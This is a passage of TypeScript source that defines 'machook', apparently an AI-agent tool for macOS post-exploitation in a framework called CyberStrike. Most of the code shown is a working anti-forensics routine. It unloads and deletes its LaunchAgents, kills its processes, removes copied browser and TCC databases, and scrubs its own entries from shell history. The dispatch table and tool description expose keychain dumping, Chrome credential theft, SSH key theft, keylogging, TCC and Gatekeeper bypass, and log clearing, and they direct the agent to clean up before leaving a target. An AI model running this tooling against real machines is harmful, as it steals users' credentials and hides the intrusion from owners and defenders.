  return { output: output.join("\n"), findings }
}

async function cleanupMac(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up CyberStrike artifacts from macOS target...\n"]
  const home = process.env.HOME || "/root"
  let cleaned = 0

  const launchAgentDirs = [`${home}/Library/LaunchAgents`, "/Library/LaunchAgents", "/Library/LaunchDaemons"]
  for (const dir of launchAgentDirs) {
    const find = await run("find", [dir, "-name", "*cyberstrike*", "-o", "-name", "*cs-*"], timeout)
    if (find.exitCode === 0 && find.stdout.trim()) {
      const files = find.stdout.trim().split("\n").filter(Boolean)
      for (const f of files) {
        const label = f.replace(/.*\//, "").replace(".plist", "")
        await run("launchctl", ["unload", f], timeout)
        await run("rm", ["-f", f], timeout)
        output.push(`[+] Removed LaunchAgent: ${f} (unloaded ${label})`)
        cleaned++
      }
    }
  }

  const csProcesses = await run("pgrep", ["-fl", "cyberstrike|cs-hook|cs-monitor"], timeout)
  if (csProcesses.exitCode === 0 && csProcesses.stdout.trim()) {
    const procs = csProcesses.stdout.trim().split("\n").filter(Boolean)
    for (const proc of procs) {
      const pid = proc.split(/\s+/)[0]
      await run("kill", ["-9", pid], timeout)
      output.push(`[+] Killed process: ${proc.trim()}`)
      cleaned++
    }
  }

  const tmpPatterns = ["/tmp/cs-*", "/tmp/cyberstrike-*", `${home}/.cs-*`]
  for (const pattern of tmpPatterns) {
    const find = await run(
      "find",
      [
        pattern.includes("*") ? pattern.replace(/\/[^/]*\*.*/, "") : pattern,
        "-name",
        pattern.replace(/.*\//, ""),
        "-maxdepth",
        "1",
      ],
      timeout,
    )
    if (find.exitCode === 0 && find.stdout.trim()) {
      const files = find.stdout.trim().split("\n").filter(Boolean)
      for (const f of files) {
        await run("rm", ["-rf", f], timeout)
        output.push(`[+] Removed temp file: ${f}`)
        cleaned++
      }
    }
  }

  const dtraceScripts = await run("find", ["/tmp", "-name", "*.d", "-newer", "/tmp", "-maxdepth", "1"], timeout)
  if (dtraceScripts.exitCode === 0 && dtraceScripts.stdout.trim()) {
    const scripts = dtraceScripts.stdout.trim().split("\n").filter(Boolean)
    for (const s of scripts) {
      await run("rm", ["-f", s], timeout)
      output.push(`[+] Removed DTrace script: ${s}`)
      cleaned++
    }
  }

  const copiedDbs = await run(
    "find",
    ["/tmp", "-name", "cs-chrome-*", "-o", "-name", "cs-safari-*", "-o", "-name", "cs-tcc-*"],
    timeout,
  )
  if (copiedDbs.exitCode === 0 && copiedDbs.stdout.trim()) {
    const dbs = copiedDbs.stdout.trim().split("\n").filter(Boolean)
    for (const db of dbs) {
      await run("rm", ["-f", db], timeout)
      output.push(`[+] Removed copied database: ${db}`)
      cleaned++
    }
  }

  const historyFiles = [".bash_history", ".zsh_history", ".python_history"]
  for (const hist of historyFiles) {
    const histPath = `${home}/${hist}`
    if (await Bun.file(histPath).exists()) {
      const content = await Bun.file(histPath).text()
      const filtered = content
        .split("\n")
        .filter((l) => !l.includes("cyberstrike") && !l.includes("machook") && !l.includes("cs-"))
        .join("\n")
      if (filtered.length !== content.length) {
        await Bun.write(histPath, filtered)
        output.push(`[+] Scrubbed CyberStrike entries from ${hist}`)
        cleaned++
      }
    }
  }

  output.push(`\n[*] Cleanup complete — ${cleaned} artifacts removed`)
  if (cleaned === 0) output.push("[*] No CyberStrike artifacts found — target is clean")

  findings.push({
    checkId: "MAC-CLEANUP-001",
    provider: "macos",
    severity: "info",
    status: "CLEANED",
    resource: "macos://cleanup",
    title: `macOS cleanup: ${cleaned} artifacts removed`,
    details: `Removed ${cleaned} CyberStrike artifacts (LaunchAgents, processes, temp files, DTrace scripts, shell history)`,
    remediation: "Verify no traces remain with: find / -name '*cyberstrike*' 2>/dev/null",
  })

  return { output: output.join("\n"), findings }
}

// ── Dispatch ──

const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
  keychain_dump: keychainDump,
  chrome_creds: chromeCreds,
  ssh_keys: sshKeys,
  tcc_bypass: tccBypass,
  keylog_mac: keylogMac,
  dtrace_exec: dtraceExec,
  dtrace_net: dtraceNet,
  dtrace_file: dtraceFile,
  xprotect_check: xprotectCheck,
  gatekeeper_bypass: gatekeeperBypass,
  log_clear: logClear,
  cleanup_mac: cleanupMac,
}

export const MachookTool = Tool.define("machook", {
  description: `Execute a macOS post-exploitation program for credential harvesting, monitoring, and stealth operations. Most programs require root privileges. DTrace programs require SIP disabled. Available programs: ${Object.keys(PROGRAMS).join(", ")}. ALWAYS run cleanup_mac before leaving a target.`,
  parameters: z.object({
    program: z.enum(Object.keys(PROGRAMS) as [string, ...string[]]).describe(
      "macOS post-exploitation program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(120).describe("Maximum execution time in seconds (default: 120)"),
  }),
  async execute(params) {
    if (process.platform !== "darwin") {
      return {
        title: `machook: ${params.program}`,
        output: `machook requires macOS. Current platform: ${process.platform}\n\nUse 'ebpf' for Linux post-exploitation or 'winhook' for Windows.`,
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const program = params.program as Program
    const handler = dispatch[program]
    const result = await handler(params.args, params.timeout_seconds)

    return {
      title: `machook: ${program}`,
      output: result.output,
      metadata: { program, findings: result.findings },
    }
  },
})
